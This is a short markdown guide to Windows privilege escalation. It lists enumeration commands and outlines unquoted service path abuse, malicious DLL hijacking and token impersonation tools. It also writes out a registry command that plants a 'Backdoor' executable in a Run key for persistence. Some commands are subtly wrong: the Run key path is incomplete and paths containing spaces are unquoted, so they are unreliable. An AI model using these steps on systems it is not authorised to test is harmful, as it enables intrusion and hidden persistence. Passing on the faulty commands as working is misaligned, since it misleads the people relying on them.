# 🪟 Windows Privilege Escalation Guide

## Overview

Windows privilege escalation techniques to escalate from user to SYSTEM/Administrator.

---

## Phase 1: Enumeration

```powershell
whoami
whoami /priv
systeminfo
net user
net localgroup administrators
```

## Phase 2: Identify Vectors

### Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i auto
Get-WmiObject win32_service | Select-Object name,pathname
```

### Weak Service Permissions

```powershell
icacls C:\Program Files\*
```

### Scheduled Tasks

```powershell
Get-ScheduledTask
schtasks /query /fo LIST /v
```

### Hot Fixes (Patches)

```powershell
wmic qfe list full
wmic qfe list brief
```

### Installed Software

```powershell
wmic product list brief
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
```

### File Permissions

```powershell
icacls C:\Users\*
icacls C:\Windows\*
```

## Phase 3: Exploitation

### Unquoted Service Path

1. Identify service
2. Place executable in path
3. Restart service

```powershell
# If path is: C:\Program Files\My App\service.exe
# Place exploit.exe at: C:\Program.exe or C:\Program Files\My.exe
```

### DLL Hijacking

1. Identify missing DLL
2. Create malicious DLL
3. Place in DLL search path
4. Restart application

### Token Impersonation

Use tools like PrintSpoofer or GodPotato

### Registry Manipulation

```powershell
reg query HKLM\Software\Microsoft\Windows\Run
reg add HKLM\Software\Microsoft\Windows\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

## Phase 4: Verification

```powershell
whoami
whoami /priv
Get-ChildItem C:\Users\Administrator\Desktop
```

